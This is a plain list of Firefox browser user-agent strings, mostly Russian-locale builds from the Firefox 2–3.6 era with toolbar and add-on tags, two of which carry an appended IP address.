Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 ( .NET CLR 3.5.30729) sputnik 2.5.0.150
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ru; rv:1.9.0.13) Gecko/2009073021 Firefox/3.0.13
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:37.163.224.158]
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.13) Gecko/2009080315 Ubuntu/8.10 (intrepid) Firefox/3.0.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 MRA 5.7 (build 03796) Firefox/3.6.23 (.NET CLR 3.5.30729) sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.5 (build 02842) Firefox/3.5.2 GTB5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.13) Gecko/2009073022 MRA 5.5 (build 02842) Firefox/3.0.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 AskTbACDS/3.12.2.16749 Firefox/3.6.23 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.21022; .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 MRA 5.7 (build 03796) Firefox/3.6.23
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 sputnik 2.5.0.90
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 AdCentriaIM/1.7 Firefox/3.5.3 GTB5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 AdCentriaIM/1.7 Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 sputnik 2.0.1.37
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 MRA 5.7 (build 03796) Firefox/3.6.23 (.NET CLR 3.5.30729) sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3 GTB5
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 AdCentriaIM/1.7 Firefox/3.5.1
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 ( .NET CLR 3.5.30729) sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 DefView Firefox/3.5.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 AskTbPTV5/3.12.2.16749 Firefox/3.6.23 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1b99) Gecko/20090605 Firefox/3.5b99 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 sputnik 2.5.0.90
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.5 (build 02830) Firefox/3.0.14 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.23) Gecko/20110920 AskTbPTV2/3.12.2.16749 Firefox/3.6.23
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 MRA 5.7 (build 03796) Firefox/3.6.23 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.4 (build 02652) Firefox/3.0.14
Mozilla/5.0 (Windows NT 5.0; rv:7.0.1) Gecko/20100101 Firefox/7.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14 GTB5 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.7 (build 03686) Firefox/3.6.3 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 ( .NET CLR 3.5.30729) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 sputnik 2.5.0.148
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.23) Gecko/20110920 MRA 5.7 (build 03755) Firefox/3.6.23 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 MRA 5.4 (build 02647) Firefox/3.5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 MRA 5.7 (build 03797) Firefox/3.6.23 sputnik 2.4.0.49
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.4 (build 02647) AdCentriaIM/1.7 Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 sputnik 2.4.0.46
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.7 (build 03790) Firefox/3.0.19 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 MRA 5.5 (build 02842) Firefox/3.5.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.3 (build 02560) Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3 sputnik 2.0.1.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 Glubble/2.0.4.9 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.5 (build 02842) Firefox/3.0.14 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 AdCentriaIM/1.7 Firefox/3.0.14 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.4 (build 02620) Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.4 (build 02647) Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 WebMoney Advisor MRA 5.7 (build 03773);
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.4 (build 02647) Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.18) Gecko/20110319 MRA 5.6 (build 03278) Firefox/3.5.18 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.5 (build 02842) Firefox/3.0.14 sputnik 2.0.1.41 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 AskTbYLC/3.13.1.18107 Firefox/3.6.23
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.3) Gecko/20090824 Ant.com Toolbar 1.4 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.23) Gecko/20110920 MRA 5.7 (build 03773) Firefox/3.6.23
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.3 (build 02552) Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.5) Gecko/2008120122 MRA 5.5 (build 02842) Firefox/3.0.5 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3;MEGAUPLOAD 1.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.5 (build 02842) Firefox/3.5.2 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03757) Firefox/3.6.15 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 sputnik 2.5.0.166
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.13) Gecko/2009073022 MRA 5.5 (build 02772) Firefox/3.0.13 sputnik 2.0.1.37
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3;fdnet sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729) FirePHP/0.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 MRA 5.7 (build 03796) Firefox/3.6.23 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 AdCentriaIM/1.7 MRA 5.5 (build 02842) Firefox/3.0.14 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02793) Firefox/3.5.3 sputnik 2.0.1.37
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.24) Gecko/20111103 MRA 5.7 (build 03755) AskTbALSV5/3.13.1.18107 Firefox/3.6.24 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.5 (build 02842) AdCentriaIM/1.7 Firefox/3.0.14 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.6 (build 03402) Firefox/3.5.7 sputnik 2.1.0.18
Mozilla/5.0 (Windows NT 5.2; rv:7.0.1) Gecko/20100101 Firefox/7.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.5 (build 02842) Firefox/3.0.14 sputnik 2.0.1.41 AutoPager/0.5.2.2 (http://www.teesoft.info/)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.7) Gecko/2009021910 MRA 5.5 (build 02842) Firefox/3.0.7 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03797) Firefox/3.6.8 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.5 (build 02842) Firefox/3.0.14 sputnik 2.0.1.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.4 (build 02647) AdCentriaIM/1.7 Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.24) Gecko/20111103 MRA 5.7 (build 03658) Firefox/3.6.24
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.3 (build 02564) Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 GTB5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 MRA 5.6 (build 03278) Firefox/3.0.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 AdCentriaIM/1.7 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.12) Gecko/20080201 MRA 5.5 (build 02842) Firefox/2.0.0.12 sputnik 2.0.1.40
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 MRA 5.5 (build 02842) Firefox/3.0.10 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686; ru-RU; rv:1.9.1.3) Gecko/20090913 Shiretoko/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091007 MRA 5.5 (build 02842) Firefox/3.5.4 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3 (.NET CLR 2.0.50727)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.4 (build 02647) Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 ( .NET CLR 3.5.30729) sputnik 2.5.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.7 (build 03797) Firefox/3.6.17 sputnik 2.5.0.90
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 MRA 5.7 (build 03796) Firefox/3.6.24 sputnik 2.5.2.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091016 MRA 5.5 (build 02842) Firefox/3.5.4 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.5 (build 02842) Firefox/3.0.14 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.10;MEGAUPLOAD 1.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.20) Gecko/20081217 MRA 5.5 (build 02842) Firefox/2.0.0.20 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4 WebMoney Advisor MRA 5.5 (build 02842);
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3 sputnik 2.0.1.41 FBSMTWB
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5pre) Gecko/20091017 Shiretoko/3.5.5pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3;fdnet (.NET CLR 2.0.50727)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.15 GTB6
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9) Gecko/2008052906 MRA 5.5 (build 02842) Firefox/3.0 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.3) Gecko/20090824 AdCentriaIM/1.7 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 GTB5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091016 AdCentriaIM/1.7 Firefox/3.5.4 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091016 Firefox/3.5.4 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02842) Firefox/3.0.15 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091016 MRA 5.5 (build 02842) Firefox/3.5.4 sputnik 2.0.1.41
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.14) Gecko/2009090900 SUSE/3.0.14-0.1.2 Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02842) Firefox/3.0.15 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091016 MRA 5.3 (build 02557) Firefox/3.5.4 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.4) Gecko/20091016 MRA 5.5 (build 02842) Firefox/3.5.4
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.6) Gecko/2009011913 AdCentriaIM/1.7 Firefox/3.0.6
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.37.53.186]
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.4) Gecko/20091016 Firefox/3.5.4 GTB5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091016 MRA 5.5 (build 02842) Firefox/3.5.4 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091016 MRA 5.5 (build 02842) Firefox/3.5.4 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.10;MEGAUPLOAD 1.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 AdCentriaIM/1.7 Firefox/3.0.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.7.10) Gecko/20050717 Firefox/1.0.6
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02842) Firefox/3.0.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02842) Firefox/3.0.15 sputnik 2.0.1.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12 WebMoney Advisor MRA 5.5 (build 02842);
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3 WebMoney Advisor MRA 5.4 (build 02647);
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090910 Shiretoko/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02842) Firefox/3.0.15 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.4) Gecko/20091016 MRA 5.5 (build 02842) Firefox/3.5.4 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02842) AdCentriaIM/1.7 Firefox/3.0.15 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02842) Firefox/3.0.15 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02842) Firefox/3.0.15 sputnik 2.0.1.41 AutoPager/0.5.2.2 (http://www.teesoft.info/)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091016 Firefox/3.5.5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.15 (.NET CLR 3.0.04506.648)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 MRA 5.5 (build 02842) Firefox/3.0.8 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 AdCentriaIM/1.7 Firefox/3.5.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.15 GTB5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 MRA 5.5 (build 02842) Firefox/3.5 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02828) AdCentriaIM/1.7 Firefox/3.5.5 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.4 (build 02647) Firefox/3.0.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02793) Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5 sputnik unknown WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.3 (build 02552) Firefox/3.5.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 sputnik 2.5.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 (.NET CLR 3.5.30729) sputnik 2.5.1.2 WebMoney Advisor
